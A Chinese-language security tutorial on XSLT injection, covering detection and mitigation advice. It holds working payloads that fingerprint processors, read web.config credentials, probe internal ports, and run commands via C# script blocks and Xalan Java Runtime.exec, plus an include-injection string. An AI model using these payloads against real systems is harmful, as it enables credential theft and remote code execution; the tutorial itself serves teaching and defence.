## ****XSLT简介****

XSL(可扩展样式表语言)是一种用于转换XML文档的语言，XSLT表示的就是XSL转换，转换后得到的一般都是不同的XML文档或其他类型文档，例如HTML文档、CSV文件以及明文文本文件等等。

一般来说，应用程序或模板引擎在处理不同文件类型时需要使用XSLT来进行数据转换。很多企业级应用比较喜欢使用XSLT，比如说，多用户发-票应用程序可以使用XSLT来允许客户自定义它们的发-票，客户可以根据自己的需求来修改发-票信息以及格式。

其他常见应用：

  * 报告功能
  * 多种格式的数据导出功能;
  * 数据打印和输出功能;
  * 电子邮件;

##  ** **XSLT举例****

个人理解，就是给XML美化生成其他文档的东西

  * xsl文件（可以理解为美化模板）

![1651822025_6274cdc9b7d2ad6d6acf7.png!small?1651822027126](https://image.3001.net/images/20220506/1651822025_6274cdc9b7d2ad6d6acf7.png!small?1651822027126)

  * xml文件（待美化的内容）

![1651822031_6274cdcf6fcfbd572107c.png!small?1651822032437](https://image.3001.net/images/20220506/1651822031_6274cdcf6fcfbd572107c.png!small?1651822032437)

  * 结合

![1651822045_6274cddd065a6149ed3d9.png!small?1651822045358](https://image.3001.net/images/20220506/1651822045_6274cddd065a6149ed3d9.png!small?1651822045358)

  * 最终美化效果

![1651822054_6274cde6dd98b876a3cf0.png!small?1651822055329](https://image.3001.net/images/20220506/1651822054_6274cde6dd98b876a3cf0.png!small?1651822055329)

##  ** **判断漏洞****

可以通过注入导致错误XML语法的字符（比如双引号、单引号、尖括号）的方法。如果服务器返回了错误，那么应用则可能易受攻击。总的来说，这种识别技术和XML注入漏洞识别技术是相同的。

##  ** **攻击****

XSLT注入，就是XLS模版文件内容可控，从而操作一些函数导致可以造成其他的危害

###  ** **system-property()函数和指纹****

我们可以通过system-property()函数来获取库发布者的名字，该函数是XSLT v1.0d的标准，所以所有的库都实现了这一点。

正确有效的参数是：

  * xsl: vendor
  * xsl: vendor-url
  * xsl: version

<?xml version="1.0" encoding="utf-8"?>  
< ** **xsl:stylesheet**** version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">  
< ** **xsl:template**** match="/fruits">  
< ** **xsl:value-of**** select="system-property('xsl:vendor')"/>  
</ ** **xsl:template**** >  
</ ** **xsl:stylesheet**** >

###  ** **使用document()进行XML文件读取+端口扫描****

document()函数允许XSLT转换获取存储在除了主数据源以外的外部XML文档中的数据。（注意：返回的格式必须是XML才行）

攻击者可以滥用document函数来读取远程系统的文件，通常是以转换结果的整个内容进行拷贝为手段。 **
**但这种攻击要求文件是格式工整的XML文档**** ，但这并不总是个问题，因为大多数时候敏感信息总是存储在XML文件中。比如在一个asp.net
web应用中，web.config文件就是个很好的例子因为它包含了数据库认证信息。

<?xml version="1.0" encoding="utf-8"?>  
< ** **xsl:stylesheet**** version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">  
< ** **xsl:template**** match="/fruits">  
< ** **xsl:copy-of**** select="document('C:\webapps\web.config')"/>  
Fruits:  
<!-- Loop for each fruit -->  
< ** **xsl:for-each**** select="fruit">  
<!-- Print name: description -->  
\- < ** **xsl:value-of**** select="name"/>: < ** **xsl:value-of****
select="description"/>  
</ ** **xsl:for-each**** >  
</ ** **xsl:template**** >  
</ ** **xsl:stylesheet**** >

document()函数可以用于获取远程系统的文档并且能通过UNC路径或如下所示URL来进行基本的网络扫描：

<?xml version="1.0" encoding="utf-8"?>  
< ** **xsl:stylesheet**** version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">  
< ** **xsl:template**** match="/fruits">  
< ** **xsl:copy-of**** select="document('http://172.16.132.1:25')"/>  
Fruits:  
<!-- Loop for each fruit -->  
< ** **xsl:for-each**** select="fruit">  
<!-- Print name: description -->  
\- < ** **xsl:value-of**** select="name"/>: < ** **xsl:value-of****
select="description"/>  
</ ** **xsl:for-each**** >  
</ ** **xsl:template**** >  
</ ** **xsl:stylesheet**** >

###  ** **嵌入脚本区块执行远程代码****

嵌入的脚本区块是专有的XSLT扩展，可以直接在XSLT文档中包含代码。在微软的实现中，可以包含C#代码。当文档被解析，远程服务器会编译然后执行代码。

<?xml version="1.0" encoding="UTF-8"?>  
< ** **xsl:stylesheet**** version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"  
xmlns:msxsl="urn:schemas-microsoft-com:xslt"  
xmlns:user="urn:my-scripts">  
  
< ** **msxsl:script**** language = "C#" implements-prefix = "user">  
<![CDATA[  
public string execute(){  
System.Diagnostics.Process proc = new System.Diagnostics.Process();  
proc.StartInfo.FileName= "C:\\\windows\\\system32\\\cmd.exe";  
proc.StartInfo.RedirectStandardOutput = true;  
proc.StartInfo.UseShellExecute = false;  
proc.StartInfo.Arguments = "/c dir";  
proc.Start();  
proc.WaitForExit();  
return proc.StandardOutput.ReadToEnd();  
}  
]]>  
</ ** **msxsl:script**** >  
  
< ** **xsl:template**** match="/fruits">  
\--- BEGIN COMMAND OUTPUT ---  
< ** **xsl:value-of**** select="user:execute()"/>  
\--- END COMMAND OUTPUT ---  
</ ** **xsl:template**** >  
</ ** **xsl:stylesheet**** >

###  ** **JAVA RCE****

xslt处理器如果不禁用，能将本机的java语言方法暴露为XSLT函数，导致任意代码执行漏洞

<?xml version="1.0" encoding="utf-8"?>  
< ** **xsl:stylesheet**** version="1.0"  
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"  
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"  
xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">  
< ** **xsl:template**** match="/">  
< ** **xsl:variable**** name="rtobject" select="rt:getRuntime()"/>  
< ** **xsl:variable**** name="process" select="rt:exec($rtobject,'ls')"/>  
< ** **xsl:variable**** name="processString" select="ob:toString($process)"/>  
< ** **xsl:value-of**** select="$processString"/>  
</ ** **xsl:template**** >  
</ ** **xsl:stylesheet**** >

###  ** **import和incldue****

前面都是考虑到可以完全控制XSL文件的情况，但如果只能控制其中的一部分内容的话，又该怎么利用呢？

攻击者通过将XSLT文档和外部文档组合来打破这种限制，import和incldue函数可以达到这样的效果。在加载外部文件时，整个文档将被解析。如果攻击者可以控制这个过程，那么他们可以使用XXE和在外部文件中使用内嵌脚本这两种攻击方式。

外部文件可能是之前上传到服务器上的文件，或者从外部通过URL引用的文件，只要文件内容是XML格式即可。

当xsl:include在其他地方使用时，xsl:import标签只能作为xsl:stylesheet标签的第一个子标签。

利用前需要闭合之前的标签，然后再插入我们注入的语句

比如

 ** **<**** /xsl:template>< ** **xsl:include****
href="external_transform.xslt"/>< ** **xsl:template**** name="a">

插入后构造出的XSL

<?xml version="1.0" encoding="utf-8"?>  
< ** **xsl:stylesheet**** version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">  
< ** **xsl:template**** match="/fruits">  
</ ** **xsl:template**** >< ** **xsl:include****
href="external_transform.xslt"/>< ** **xsl:template**** name="a">  
Fruits:  
<!-- Loop for each fruit -->  
< ** **xsl:for-each**** select="fruit">  
<!-- Print name: description -->  
\- < ** **xsl:value-of**** select="name"/>: < ** **xsl:value-of****
select="description"/>  
</ ** **xsl:for-each**** >  
</ ** **xsl:template**** >  
< ** **xsl:include**** href="external_transform.xslt"/>  
</ ** **xsl:stylesheet**** >

##  ** **安全建议****

  * 尽可能避免使用用户提供的XSLT文档
  * 不要使用不受信任的输入去生成XSLT文档，比如拼接字符串。如果需要非静态值，则应将其包含在XML数据文件中，并且仅由XSLT文档引用
  * 明确禁止使用XSLT库实现的危险功能。查阅库的文档如何禁用XML外部实体、document()函数、import和include标签。确保嵌入脚本扩展是禁用的，同时其他允许读或写外部文件的专用扩展也禁用。

##  ** **参考****

  * [【译】XSLT attack](https://xz.aliyun.com/t/33)
  * [XSLT - 转换](https://www.runoob.com/xsl/xsl-transformation.html)

